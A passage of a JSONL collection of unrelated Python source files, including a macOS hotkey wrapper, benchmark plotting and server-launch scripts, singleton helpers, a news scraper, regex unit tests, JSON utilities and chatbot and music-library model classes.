ctypes.c_int32\nCarbon.UnregisterEventHotKey.argtypes = [ctypes.c_void_p]\nCarbon.UnregisterEventHotKey.restype = ctypes.c_int32\n\nclass EventHotKeyRef(object):\n    __slots__ = ('hotKeyRef')\n    def __init__(self, hotKeyRef):\n        self.hotKeyRef = hotKeyRef\n\n    @property\n    def address(self):\n        return self.hotKeyRef.value\n\n    def UnregisterEventHotKey(self):\n        err = Carbon.UnregisterEventHotKey(self.hotKeyRef)\n        if err != 0: # noErr\n            raise Exception('UnregisterEventHotKey failed: %d' % err)\n\n    def __eq__(self, other):\n        return (self.__class__ == other.__class__ and\n                self.hotKeyRef.value == other.hotKeyRef.value)\n\n    def __hash__(self):\n        return self.hotKeyRef.value\n\n    def __repr__(self):\n        return '<EventHotKeyRef: 0x%x>' % self.hotKeyRef.value\n\ndef RegisterEventHotKey(keyCode, mods, hotKeyID=EventHotKeyID(),\n                        target=Carbon.GetApplicationEventTarget(), options=0):\n    hotKeyRef = ctypes.c_void_p()\n    err = Carbon.RegisterEventHotKey(keyCode, mods, hotKeyID,\n                                     target, options, ctypes.byref(hotKeyRef))\n    if err != 0: # noErr\n        raise Exception('RegisterEventHotKey failed: %d' % err)\n    return EventHotKeyRef(hotKeyRef)\n\nif __name__ == '__main__':\n    from Carbon.Events import cmdKey\n    hk = RegisterEventHotKey(100, cmdKey)\n    print hk\n    hk.UnregisterEventHotKey()\n"}
{"text": "import numpy as np\nimport matplotlib.pyplot as plt\nfrom matplotlib import rc\nrc('font',**{'family':'serif','serif':['Palatino'],'size':14})\nrc('text', usetex=True)\n\ndef read_results():\n\n    ms, ns, times_eigen, times_fastor = [], [], [], []\n    with open(\"benchmark_results.txt\", \"r\") as f:\n        lines = f.readlines()\n    for line in lines:\n        sline = line.split(' ')\n        if len(sline) == 4:\n            times_eigen.append(float(sline[1]))\n            times_fastor.append(float(sline[2]))\n        elif len(sline) == 7 and \"size\" in sline[1]:\n            ms.append(int(sline[4]))\n            ns.append(int(sline[5]))\n\n    return np.array(ms), np.array(ns), np.array(times_eigen), np.array(times_fastor)\n\n\ndef main():\n\n    ms, ns, times_eigen, times_fastor = read_results()\n\n    fig, ax = plt.subplots()\n    index = np.arange(len(ms))\n    bar_width = 0.2\n    opacity = 0.8\n\n    rects1 = plt.bar(index, times_eigen/1e-6, bar_width,\n        alpha=opacity,\n        color='#C03B22',\n        label='Eigen')\n\n    rects3 = plt.bar(index + bar_width, times_fastor/1e-6, bar_width,\n        alpha=opacity,\n        color='#E98604',\n        label='Fastor')\n\n\n    xticks = [str(dim[0]) + 'x' + str(dim[1]) for dim in zip(ms,ns)]\n    plt.xlabel('(M,M)')\n    plt.ylabel('Time ($\\mu$sec)')\n    plt.title(\"B = inv(A)\")\n    plt.xticks(index, xticks, rotation=45)\n    plt.legend()\n\n    plt.tight_layout()\n    plt.grid(True)\n    # plt.savefig('benchmark_inverse_single.png', format='png', dpi=300)\n    # plt.savefig('benchmark_inverse_single.png', format='png', dpi=300)\n    plt.show()\n\n\nif __name__ == \"__main__\":\n    main()"}
{"text": "####################################################################################################\n# \n# MonitorServer - A Server Monitoring Application\n# Copyright (C) 2014 Fabrice Salvaire\n#\n# This program is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n# \n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n# \n# You should have received a copy of the GNU General Public License\n# along with this program.  If not, see <http://www.gnu.org/licenses/>.\n# \n####################################################################################################\n\n####################################################################################################\n\n\"\"\"\nSingleton snippets.\n\"\"\"\n\n####################################################################################################\n\nfrom __future__ import print_function\n\n####################################################################################################\n\nimport threading \n\n####################################################################################################\n\nclass SingletonMetaClass(type):\n\n    \"\"\" A singleton metaclass.\n    \n    This implementation supports subclassing and is thread safe.\n    \"\"\"\n\n    ##############################################\n\n    def __init__(cls, class_name, super_classes, class_attribute_dict):\n\n        # It is called just after cls creation in order to complete cls.\n\n        # print('MetaSingleton __init__:', cls, class_name, super_classes, class_attribute_dict, sep='\\n... ')\n\n        type.__init__(cls, class_name, super_classes, class_attribute_dict)\n\n        cls._instance = None\n        cls._rlock = threading.RLock() # A factory function that returns a new reentrant lock object.\n        \n    ##############################################\n\n    def __call__(cls, *args, **kwargs):\n\n        # It is called when cls is instantiated: cls(...).\n        # type.__call__ dispatches to the cls.__new__ and cls.__init__ methods.\n\n        # print('MetaSingleton __call__:', cls, args, kwargs, sep='\\n... ')\n\n        with cls._rlock:\n            if cls._instance is None:\n                cls._instance = type.__call__(cls, *args, **kwargs)\n\n        return cls._instance\n\n####################################################################################################\n\nclass singleton(object):\n\n    \"\"\" A singleton class decorator.\n    \n    This implementation doesn't support subclassing.\n    \"\"\"\n\n    ##############################################\n\n    def __init__(self, cls):\n\n        # print('singleton __init__: On @ decoration', cls, sep='\\n... ')\n\n        self._cls = cls\n        self._instance = None\n\n    ##############################################\n\n    def __call__(self, *args, **kwargs):\n\n        # print('singleton __call__: On instance creation', self, args, kwargs, sep='\\n... ')\n\n        if self._instance is None:\n            self._instance = self._cls(*args, **kwargs)\n\n        return self._instance\n\n####################################################################################################\n\ndef singleton_func(cls):\n\n    \"\"\" A singleton function decorator.\n    \n    This implementation doesn't support subclassing.\n    \"\"\"\n\n    # print('singleton_func: On @ decoration', cls, sep='\\n... ')\n\n    instances = {}\n\n    def get_instance(*args, **kwargs):\n        # print('singleton_func: On instance creation', cls, sep='\\n... ')\n        if cls not in instances:\n            instances[cls] = cls(*args, **kwargs)\n        return instances[cls]\n\n    return get_instance\n\n####################################################################################################\n\nclass monostate(object):\n\n    \"\"\" A monostate base class.\n    \"\"\"\n\n    _shared_state = {}\n\n    ##############################################\n\n    def __new__(cls, *args, **kwargs):\n\n        # print('monostate __new__:', cls, args, kwargs, sep='\\n... ')\n\n        obj = super(monostate, cls).__new__(cls, *args, **kwargs)\n        obj.__dict__ = cls._shared_state\n\n        return obj\n\n####################################################################################################\n#\n# End\n#\n####################################################################################################\n"}
{"text": "\"\"\"The logical connection object that links two devices together\"\"\"\r\n\r\nfrom Devices.Bridge import *\r\nfrom Devices.Firewall import *\r\nfrom Devices.Hub import *\r\nfrom Devices.Mobile import *\r\nfrom Devices.Router import *\r\nfrom Devices.Subnet import *\r\nfrom Devices.Switch import *\r\nfrom Devices.UML import *\r\nfrom Devices.UML_Android import *\r\nfrom Devices.UML_FreeDOS import *\r\nfrom Devices.Wireless_access_point import *\r\nfrom UI.Edge import *\r\nfrom Devices.REALM import *\r\nfrom Devices.OpenFlow_Controller import *\r\n\r\n# The connection rules for building topologies\r\nconnection_rule={}\r\nconnection_rule[UML.device_type]=(Switch.device_type, Subnet.device_type, Bridge.device_type, Hub.device_type)\r\nconnection_rule[UML_Android.device_type]=connection_rule[UML.device_type]\r\nconnection_rule[UML_FreeDOS.device_type]=connection_rule[UML.device_type]\r\nconnection_rule[Router.device_type]=(Subnet.device_type, OpenFlow_Controller.device_type)\r\nconnection_rule[Switch.device_type]=(UML.device_type, Subnet.device_type, Switch.device_type, REALM.device_type)\r\nconnection_rule[Bridge.device_type]=(UML.device_type, Subnet.device_type, REALM.device_type)\r\nconnection_rule[Hub.device_type]=(UML.device_type, Subnet.device_type, REALM.device_type)\r\nconnection_rule[Wireless_access_point.device_type]=(Mobile.device_type)\r\nconnection_rule[Subnet.device_type]=(UML.device_type, Switch.device_type, Router.device_type, Bridge.device_type, Hub.device_type, Firewall.device_type, REALM.device_type)\r\nconnection_rule[Mobile.device_type]=(Wireless_access_point.device_type)\r\nconnection_rule[Firewall.device_type]=(Subnet.device_type)\r\nconnection_rule[REALM.device_type]=(Switch.device_type, Subnet.device_type, Bridge.device_type, Hub.device_type)\r\nconnection_rule[OpenFlow_Controller.device_type]=(Router.device_type)\r\n\r\nclass Connection(Edge):\r\n    device_type = \"Connection\"\r\n\r\n    def __init__(self, source, dest):\r\n        \"\"\"\r\n        Create a connection to link devices together.\r\n        \"\"\"\r\n        Edge.__init__(self, source, dest)\r\n    \r\n    def getOtherDevice(self, node):\r\n        \"\"\"\r\n        Retrieve the device opposite to node from this connection.\r\n        \"\"\"\r\n        if self.source == node:\r\n            return self.dest\r\n        return self.source\r\n"}
{"text": "import subprocess\nimport sys\nimport setup_util\nimport os\n\ndef start(args, logfile, errfile):\n  setup_util.replace_text('dart-stream/postgresql.yaml', 'host: .*', 'host: ' + args.database_host)\n  setup_util.replace_text('dart-stream/mongodb.yaml', 'host: .*', 'host: ' + args.database_host)\n  try:\n    #\n    # install dart dependencies\n    #\n    subprocess.check_call('pub upgrade', shell=True, cwd='dart-stream', stderr=errfile, stdout=logfile)\n    #\n    # start dart servers\n    #\n    for port in range(9001, 9001 + args.max_threads):\n      subprocess.Popen('dart server.dart -a 127.0.0.1 -p ' + str(port) + ' -d ' + str(args.max_concurrency / args.max_threads), shell=True, cwd='dart-stream', stderr=errfile, stdout=logfile)\n    #\n    # create nginx configuration\n    #\n    conf = []\n    conf.append('worker_processes ' + str(args.max_threads) + ';')\n    conf.append('error_log /dev/null crit;')\n    conf.append('events {')\n    conf.append('    worker_connections 1024;')\n    conf.append('}')\n    conf.append('http {')\n    conf.append('    access_log off;')\n    conf.append('    include /usr/local/nginx/conf/mime.types;')\n    conf.append('    default_type application/octet-stream;')\n    conf.append('    sendfile on;')\n    conf.append('    upstream dart_cluster {')\n    for port in range(9001, 9001 + args.max_threads):\n      conf.append('        server 127.0.0.1:' + str(port) + ';')\n    conf.append('        keepalive ' + str(args.max_concurrency / args.max_threads) + ';')\n    conf.append('    }')\n    conf.append('    server {')\n    conf.append('        listen 8080;')\n    conf.append('        location / {')\n    conf.append('            proxy_pass http://dart_cluster;')\n    conf.append('            proxy_http_version 1.1;')\n    conf.append('            proxy_set_header Connection \"\";')\n    conf.append('        }')\n    conf.append('    }')\n    conf.append('}')\n    #\n    # write nginx configuration to disk\n    #\n    with open('dart-stream/nginx.conf', 'w') as f:\n      f.write('\\n'.join(conf))\n    #\n    # start nginx\n    #\n    subprocess.Popen('sudo /usr/sbin/nginx -c `pwd`/nginx.conf', shell=True, cwd='dart-stream', stderr=errfile, stdout=logfile);\n    return 0\n  except subprocess.CalledProcessError:\n    return 1\n\ndef stop(logfile, errfile):\n  #\n  # stop nginx\n  #\n  subprocess.check_call('sudo /usr/sbin/nginx -c `pwd`/nginx.conf -s stop', shell=True, cwd='dart-stream', stderr=errfile, stdout=logfile)\n  os.remove('dart-stream/nginx.conf')\n  #\n  # stop dart servers\n  #\n  p = subprocess.Popen(['ps', 'aux'], stdout=subprocess.PIPE)\n  out, err = p.communicate()\n  for line in out.splitlines():\n    if 'dart' in line and 'run-tests' not in line:\n      pid = int(line.split(None, 2)[1])\n      os.kill(pid, 9)\n  return 0\n"}
{"text": "#!/usr/bin/env python\n\n\"\"\"\n@package ion.agents.data.test.test_moas_ctdgv\n@file ion/agents/data/test_moas_ctdgv\n@author Bill French\n@brief End to end testing for moas ctdgv\n\"\"\"\n\n__author__ = 'Bill French'\n\n\nimport gevent\nimport os\nfrom pyon.public import log\nfrom nose.plugins.attrib import attr\n\nfrom ion.agents.data.test.dataset_test import DatasetAgentTestCase\nfrom ion.services.dm.test.dm_test_case import breakpoint\nfrom pyon.agent.agent import ResourceAgentState\nimport unittest\n\n###############################################################################\n# Global constants.\n###############################################################################\n\n\n@attr('INT', group='sa')\nclass GliderCTDTest(DatasetAgentTestCase):\n    \"\"\"\n    Verify dataset agent can harvest data fails, parse the date, publish,\n    ingest and retrieve stored data.\n    \"\"\"\n    def setUp(self):\n        self.test_config.initialize(\n            instrument_device_name = 'CTDGV-01',\n            preload_scenario= 'GENG,CTDGV',\n            stream_name= 'ggldr_ctdgv_delayed',\n\n            # Uncomment this line to load driver from a local repository\n            #mi_repo = '/Users/wfrench/Workspace/code/wfrench/marine-integrations'\n        )\n\n        super(GliderCTDTest, self).setUp()\n\n    def test_parse(self):\n        \"\"\"\n        Verify file import and connection ids\n        \"\"\"\n        expected_state = {'version': 0.1,\n                          'unit_363_2013_245_10_6.mrg': {'ingested': True, 'parser_state': {'position': 1852}, 'file_checksum': '31b4a31fb4a192ce67c89dfe32b72813', 'file_mod_date': 1391110766.0, 'file_size': 1852},\n                          'unit_363_2013_245_6_6.mrg': {'ingested': True, 'parser_state': {'position': 5599}, 'file_checksum': 'e14ee0749eceb928390ed007b7d7ebd1', 'file_mod_date': 1391110815.0, 'file_size': 5914}}\n\n        self.assert_initialize()\n\n        self.assert_driver_state(None)\n\n        self.create_sample_data(\"moas_ctdgv/file_1.mrg\", \"unit_363_2013_245_6_6.mrg\")\n        self.create_sample_data(\"moas_ctdgv/file_2.mrg\", \"unit_363_2013_245_10_6.mrg\")\n\n        granules = self.get_samples(self.test_config.stream_name, 4)\n        self.assert_data_values(granules, 'moas_ctdgv/merged.result.yml')\n        self.assert_driver_state(expected_state)\n\n        self.assert_agent_state_after_restart()\n        self.assert_sample_queue_size(self.test_config.stream_name, 0)\n\n    def test_large_file(self):\n        \"\"\"\n        Verify a large file import with no buffering\n        \"\"\"\n        self.assert_initialize()\n\n        self.create_sample_data(\"moas_ctdgv/unit_363_2013_199_0_0.mrg\", \"unit_363_2013_199_0_0.mrg\")\n        gevent.sleep(10)\n        self.assert_sample_queue_size(self.test_config.stream_name, 1)\n\n        self.create_sample_data(\"moas_ctdgv/unit_363_2013_199_1_0.mrg\", \"unit_363_2013_199_1_0.mrg\")\n        gevent.sleep(10)\n        self.assert_sample_queue_size(self.test_config.stream_name, 2)\n\n        self.create_sample_data(\"moas_ctdgv/unit_363_2013_245_6_6.mrg\", \"unit_363_2013_245_6_6.mrg\")\n        self.get_samples(self.test_config.stream_name, 171, 180)\n        self.assert_sample_queue_size(self.test_config.stream_name, 0)\n\n    def test_capabilities(self):\n        self.assert_agent_capabilities()\n\n    def test_lost_connection(self):\n        \"\"\"\n        Test a parser exception and verify that the lost connection logic works\n        \"\"\"\n        self.assert_initialize()\n\n        path = self.create_sample_data(\"moas_ctdgv/file_1.mrg\", \"unit_363_2013_245_6_6.mrg\")\n        os.chmod(path, 0000)\n\n        self.assert_state_change(ResourceAgentState.LOST_CONNECTION)\n\n        # Sleep long enough to let the first reconnect happen and fail again.\n        gevent.sleep(65)\n\n        # Resolve the issue\n        os.chmod(path, 0755)\n\n        # We should transition back to streaming and stay there.\n        self.assert_state_change(ResourceAgentState.STREAMING, timeout=180)\n        self.create_sample_data(\"moas_ctdgv/file_2.mrg\", \"unit_363_2013_245_10_6.mrg\")\n\n        granules = self.get_samples(self.test_config.stream_name, 4, timeout=30)\n        self.assert_data_values(granules, 'moas_ctdgv/merged.result.yml')\n\n"}
{"text": "#!/usr/bin/env python\n# -*- coding: utf8 -*-\n\"\"\"pconf lives at <https://github.com/tony/pconf>.\n\npconf\n~~~~~\n\nPython configuration management for humans.\n\n\"\"\"\nimport os\nimport sys\nfrom setuptools import setup, find_packages\n\n\nwith open('requirements.pip') as f:\n    install_reqs = [line for line in f.read().split('\\n') if line]\n    tests_reqs = []\n\nif sys.version_info < (2, 7):\n    install_reqs += ['argparse']\n    tests_reqs += ['unittest2']\n\nimport re\nVERSIONFILE = \"tony/__init__.py\"\nverstrline = open(VERSIONFILE, \"rt\").read()\nVSRE = r\"^__version__ = ['\\\"]([^'\\\"]*)['\\\"]\"\nmo = re.search(VSRE, verstrline, re.M)\nif mo:\n    __version__ = mo.group(1)\nelse:\n    raise RuntimeError(\"Unable to find version string in %s.\" % (VERSIONFILE,))\n\nsetup(\n    name='tony',\n    version=__version__,\n    url='https://github.com/tony/pconf',\n    download_url='https://pypi.python.org/pypi/tony',\n    license='BSD',\n    author='Tony Narlock',\n    author_email='tony@git-pull.com',\n    description='China fit into a python package.',\n    long_description=open('README.rst').read(),\n    include_package_data=True,\n    install_requires=install_reqs,\n    tests_require=tests_reqs,\n    test_suite='tony.testsuite',\n    zip_safe=False,\n    packages=find_packages(exclude=[\"doc\"]),\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        \"License :: OSI Approved :: BSD License\",\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        \"Topic :: Utilities\",\n        \"Topic :: System :: Shells\",\n    ],\n)\n"}
{"text": "from bs4 import BeautifulSoup\nimport urllib\n#csv is for the csv writer\nimport csv\n\n#this will hold the output\nholder = {}\n\n\n\n#opens the input doc\ntxt = open(\"qz-rfa.csv\")\n#is the contents of the doc\n#inputs = txt.read()\n\n#opens the output doc\noutput_txt = open(\"output.txt\", \"w\")\n\nprint txt\n\ndef headliner(url):\n\n    #iterate through the urls\n\n    parsed_urls = csv.reader(url)\n    for row in parsed_urls:\n\n        number = 0\n        row_contents = row[number]\n        print row_contents\n        number += 1\n\n\n        if \"rfa\" in row_contents:\n            #opens the url for read access\n            this_url = urllib.urlopen(row_contents).read()\n            #creates a new BS holder based on the URL\n            soup = BeautifulSoup(this_url, 'lxml')\n\n            #creates the headline section\n            headline_text = 'Radio Free Asia: '\n            headline = soup.find_all('title')\n            for element in headline:\n                    headline_text += ''.join(element.findAll(text = True)).encode('utf-8').strip()\n\n\n\n\n            #creats the body text\n            #This turns the html text into regular text\n            article_text = row_contents + \"\\n\" + \"\\r\"\n            #This finds each paragraph\n            article = soup.find(\"div\", {\"id\" : \"storytext\"}).findAll('p')\n            #for each paragraph\n            for element in article:\n                #add a line break and then the text part of the paragraph\n                #the .encode part fixes unicode bullshit\n                article_text += '\\n' + ''.join(element.findAll(text = True)).encode('utf-8').strip()\n\n            holder[headline_text] = article_text\n\n\n            \"\"\"\n            output_txt.write(str(headline_text))\n            output_txt.write(\"\\n\")\n            output_txt.write(\"\\r\")\n            output_txt.write(\"\\r\")\n            output_txt.write(str(headline_text))\n            output_txt.write(\"\\n\")\n            output_txt.write(str(article_text))\n            output_txt.write(\"\\n\")\n            output_txt.write(\"\\r\")\n            output_txt.write(\"\\r\")\n            output_txt.write(\"\\r\")\n            output_txt.write(\"\\r\")\n            \"\"\"\n\n        if \"qz\" in row_contents:\n            #opens the url for read access\n            this_url = urllib.urlopen(row_contents).read()\n            #creates a new BS holder based on the URL\n            soup = BeautifulSoup(this_url, 'lxml')\n\n\n            #creates the headline section\n            headline_text = 'Quartz: '\n            headline = soup.find_all('h1')\n            for element in headline:\n                    headline_text += ''.join(element.findAll(text = True)).encode('utf-8').strip()\n\n\n\n\n            #creats the body text\n            #This turns the htlm text into regular text\n            article_text = row_contents + \"\\n\" + \"\\r\"\n            #This finds each paragraph\n            article = soup.find(\"div\", {\"class\" : \"item-body\"}).findAll('p')\n            #for each paragraph\n            for element in article:\n                #add a line break and then the text part of the paragraph\n                #the .encode part fixes unicode bullshit\n                article_text += '\\n' + ''.join(element.findAll(text = True)).encode('utf-8').strip()\n\n\n\n            holder[headline_text] = article_text\n\n            \"\"\"\n            output_txt.write(str(headline_text))\n            output_txt.write(\"\\n\")\n            output_txt.write(\"\\r\")\n            output_txt.write(\"\\r\")\n            output_txt.write(str(headline_text))\n            output_txt.write(\"\\n\")\n            output_txt.write(str(article_text))\n            output_txt.write(\"\\n\")\n            output_txt.write(\"\\r\")\n            output_txt.write(\"\\r\")\n            output_txt.write(\"\\r\")\n            output_txt.write(\"\\r\")\n            \"\"\"\n\n        else:\n            print \"not a story from a known source\"\n\nheadliner(txt)\n\n#this is just for debugging\nprint holder\n\n#iterates through the headlines in holder and writes them to the doc\n#this is the TOC\nfor head, body in holder.items():\n    output_txt.write(str(head))\n    output_txt.write(\"\\r\")\n    output_txt.write(\"\\r\")\n\n#iterates through the headlines and body in holder and writes them to doc\n#this is the body of the email\n\nfor head, body in holder.items():\n    output_txt.write(\"\\r\")\n    output_txt.write(str(head))\n    output_txt.write(\"\\r\")\n    output_txt.write(\"\\r\")\n    output_txt.write(str(body))\n    output_txt.write(\"\\r\")\n\n\n\ntxt.close()\noutput_txt.close()\n"}
{"text": "from tagtrain import data\nfrom tagtrain.tagtrain import TagTrainResponse, C_MEMBER, C_GROUP\n\n\nclass UnBlacklist(TagTrainResponse):\n    TYPE = TagTrainResponse.TYPE_COMMENTORMESSAGE\n    CMD_REGEX = f'unblacklist {C_MEMBER} {C_GROUP}?'\n    HELP_TEXT = (\"`u/{botname} unblacklist <member-name> [<group-name>]` - \"\n                 \"Allows previously blacklisted specified Member to add themselves, either for all \"\n                 \"your Groups or just specified Group\")\n\n    def run(self, reply, message, match):\n        self.LOGGER.debug('blacklist')\n        owner_name = message.author.name\n        member_name = match.group('member')\n        group_name = match.group('group')\n\n        try:\n            data.by_owner.unblacklist_user(owner_name, member_name, group_name)\n\n        except data.Group.DoesNotExist:\n            reply.append(f'Group `{group_name}` does not exist.  Skipping.')\n            return\n\n        except data.Blacklist.DoesNotExist:\n            t = f'Group `{group_name}`' if group_name else 'Blanket'\n            reply.append(t + f' Blacklist for Member `{member_name}` does not exist.  Skipping.')\n            return\n\n        t = f'Group `{group_name}`' if group_name else 'Blanket'\n        reply.append(t + f' Blacklist for Member `{member_name}` removed.')\n"}
{"text": "#!/usr/bin/python\n# vim:set fileencoding=utf-8\n#\n# This program is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation; either version 2 of the License, or\n# (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\nimport unittest\n\nfrom regexcheck import regex_match\nfrom pyanaconda.core.regexes import ISCSI_IQN_NAME_REGEX, ISCSI_EUI_NAME_REGEX\n\nclass iSCSIiqnnameRegexTestCase(unittest.TestCase):\n    def iqnname_test(self):\n        good_tests = [\n                'iqn.2014-15.com.example',\n                'iqn.2014-15.com.example:iscsi',\n                'iqn.2014-15.c-om.example:iscsi',\n                'iqn.2014-15.c.om.example:iscsi',\n                'iqn.2014-15.com.example:...',\n                'iqn.2014-15.com.example:iscsi_@nything_except_colon_after_colon!'\n                ]\n\n        bad_tests = [\n                'iqn',\n                'iqn.',\n                'iqn.2014-15',\n                'iqn.2014-15.',\n                'iqn.2014-15..',\n                'iqn.2014-15.com.example.',\n                'iqn.2014-15.com.example...',\n                'iqn.2014-15.com.example:',\n                'iqn.2014-15.-com.example',\n                'iqn.2014-15.com-.example',\n                'iqn.2014-15.-.example',\n                'iqn.2014-15.com.example-:iscsi',\n                'abciqn.2014-15.com.example:iscsi',\n                'iqn.2014-15.-.example:iscsi',\n                'iqn.2014-15.com&com.example:iscsi',\n                'iqn.2014-15.com.example:iscsi:doublecolon',\n                'iqn.2014-15..om.example:iscsi',\n                ]\n\n        if not regex_match(ISCSI_IQN_NAME_REGEX, good_tests, bad_tests):\n            self.fail()\n\nclass iSCSIeuinameRegexTestCase(unittest.TestCase):\n    def euiname_test(self):\n        good_tests = [\n                'eui.ABCDEF0123456789',\n                'eui.abcdef0123456789',\n                'eui.0123456789ABCDEF'\n                ]\n\n        bad_tests = [\n                'eui',\n                'eui.',\n                'eui.2014-',\n                'eui.exampleeui789abc'\n                'eui.AAAABBBBCCC2345',\n                'eui.AAAABBBBCCCCD4567'\n                ]\n\n        if not regex_match(ISCSI_EUI_NAME_REGEX, good_tests, bad_tests):\n            self.fail()\n"}
{"text": "import simplejson\n\n# declare direct exports here\nloads = simplejson.loads\nJSONDecodeError = simplejson.JSONDecodeError\n\ndef _simplejson_datetime_serializer(obj):\n    \"\"\" Designed to be passed as simplejson.dumps default serializer.\n\n    Serializes dates and datetimes to ISO strings.\n    \"\"\"\n    if hasattr(obj, 'isoformat'):\n        return obj.isoformat()\n    else:\n        raise TypeError('Object of type %s with value of %s is not JSON serializable' % (type(obj), repr(obj)))\n\ndef _set_defaults(kwargs, pretty=False):\n    kwargs.setdefault('default', _simplejson_datetime_serializer)\n    kwargs.setdefault('for_json', True)\n    if pretty:\n        kwargs.setdefault('separators', (',', ': '))\n        kwargs.setdefault('indent', ' ' * 4)\n        kwargs.setdefault('sort_keys', True)\n    else:\n        kwargs.setdefault('separators', (',', ':'))\n\n    return kwargs\n\ndef dumps(data, **kwargs):\n    \"\"\" Dump the provided data to JSON via simplejson.\n\n    Sets a bunch of default options providing the following functionality:\n\n        * serializes anything with a isoformat method (like datetime) to a iso timestamp.\n        * if it encounters an unknown object it will try calling for_json on it\n          to get a json serializable version.\n    \"\"\"\n    return simplejson.dumps(data, **_set_defaults(kwargs))\n\ndef pretty_dumps(data, **kwargs):\n    \"\"\" Same as dumps, except it formats the JSON so it looks pretty. \"\"\"\n    return simplejson.dumps(data, **_set_defaults(kwargs, pretty=True))\n\ndef safe_loads(data, default, **kwargs):\n    \"\"\" Tries to load the provided data, on failure returns the default instead. \"\"\"\n    try:\n        return simplejson.loads(data, **kwargs)\n    except JSONDecodeError:\n        return default\n"}
{"text": "import logging\n\nfrom fuocore.models import (\n    BaseModel,\n    SongModel,\n    AlbumModel,\n    ArtistModel,\n    SearchModel,\n)\n\nfrom .provider import provider\n\nlogger = logging.getLogger(__name__)\n\n\nclass LBaseModel(BaseModel):\n    _detail_fields = ()\n\n    class Meta:\n        allow_get = True\n        provider = provider\n\n\nclass LSongModel(SongModel, LBaseModel):\n    class Meta:\n        fields = ('disc', 'genre', 'date', 'track', 'cover', 'desc')\n        fields_no_get = ('lyric', )\n\n    @classmethod\n    def get(cls, identifier):\n        return cls.meta.provider.library.get_song(identifier)\n\n    @classmethod\n    def list(cls, identifier_list):\n        return map(cls.meta.provider.library._songs.get, identifier_list)\n\n\nclass LAlbumModel(AlbumModel, LBaseModel):\n    _detail_fields = ('songs',)\n\n    @classmethod\n    def get(cls, identifier):\n        return cls.meta.provider.library.get_album(identifier)\n\n\nclass LArtistModel(ArtistModel, LBaseModel):\n    _detail_fields = ('songs',)\n\n    @classmethod\n    def get(cls, identifier):\n        return cls.meta.provider.library.get_artist(identifier)\n\n\nclass LSearchModel(SearchModel, LBaseModel):\n    pass\n"}
{"text": "# -*- coding: utf-8 -*-\nfrom .response import Response\nfrom datetime import datetime\n\n\nclass Statement(object):\n    \"\"\"\n    A statement represents a single spoken entity, sentence or\n    phrase that someone can say.\n    \"\"\"\n\n    def __init__(self, text, **kwargs):\n        self.text = text\n        self.in_response_to = kwargs.pop('in_response_to', [])\n\n        # The date and time that this statement was created at\n        self.created_at = kwargs.pop('created_at', datetime.now())\n\n        self.extra_data = kwargs.pop('extra_data', {})\n\n        # This is the confidence with which the chat bot believes\n        # this is an accurate response. This value is set when the\n        # statement is returned by the chat bot.\n        self.confidence = 0\n\n        self.storage = None\n\n    def __str__(self):\n        return self.text\n\n    def __repr__(self):\n        return '<Statement text:%s>' % (self.text)\n\n    def __hash__(self):\n        return hash(self.text)\n\n    def __eq__(self, other):\n        if not other:\n            return False\n\n        if isinstance(other, Statement):\n            return self.text == other.text\n\n        return self.text == other\n\n    def save(self):\n        \"\"\"\n        Save the statement in the database.\n        \"\"\"\n        self.storage.update(self)\n\n    def add_extra_data(self, key, value):\n        \"\"\"\n        This method allows additional data to be stored on the statement object.\n\n        Typically this data is something that pertains just to this statement.\n        For example, a value stored here might be the tagged parts of speech for\n        each word in the statement text.\n\n            - key = 'pos_tags'\n            - value = [('Now', 'RB'), ('for', 'IN'), ('something', 'NN'), ('different', 'JJ')]\n\n        :param key: The key to use in the dictionary of extra data.\n        :type key: str\n\n        :param value: The value to set for the specified key.\n        \"\"\"\n        self.extra_data[key] = value\n\n    def add_response(self, response):\n        \"\"\"\n        Add the response to the list of statements that this statement is in response to.\n        If the response is already in the list, increment the occurrence count of that response.\n\n        :param response: The response to add.\n        :type response: `Response`\n        \"\"\"\n        if not isinstance(response, Response):\n            raise Statement.InvalidTypeException(\n                'A {} was recieved when a {} instance was expected'.format(\n                    type(response),\n                    type(Response(''))\n                )\n            )\n\n        updated = False\n        for index in range(0, len(self.in_response_to)):\n            if response.text == self.in_response_to[index].text:\n                self.in_response_to[index].occurrence += 1\n                updated = True\n\n        if not updated:\n            self.in_response_to.append(response)\n\n    def remove_response(self, response_text):\n        \"\"\"\n        Removes a response from the statement's response list based\n        on the value of the response text.\n\n        :param response_text: The text of the response to be removed.\n        :type response_text: str\n        \"\"\"\n        for response in self.in_response_to:\n            if response_text == response.text:\n                self.in_response_to.remove(response)\n                return True\n        return False\n\n    def get_response_count(self, statement):\n        \"\"\"\n        Find the number of times that the statement has been used\n        as a response to the current statement.\n\n        :param statement: The statement object to get the count for.\n        :type statement: `Statement`\n\n        :returns: Return the number of times the statement has been used as a response.\n        :rtype: int\n        \"\"\"\n        for response in self.in_response_to:\n            if statement.text == response.text:\n                return response.occurrence\n\n        return 0\n\n    def serialize(self):\n        \"\"\"\n        :returns: A dictionary representation of the statement object.\n        :rtype: dict\n        \"\"\"\n        data = {}\n\n        data['text'] = self.text\n        data['in_response_to'] = []\n        data['created_at'] = self.created_at\n        data['extra_data'] = self.extra_data\n\n        for response in self.in_response_to:\n            data['in_response_to'].append(response.serialize())\n\n        return data\n\n    @property\n    def response_statement_cache(self):\n        \"\"\"\n        This property is to allow ChatterBot Statement objects to\n        be swappable with Django Statement models.\n        \"\"\"\n        return self.in_response_to\n\n    class InvalidTypeException(Exception):\n\n        def __init__(self, value='Recieved an unexpected value type.'):\n            self.value = value\n\n        def __str__(self):\n            return repr(self.value)\n"}
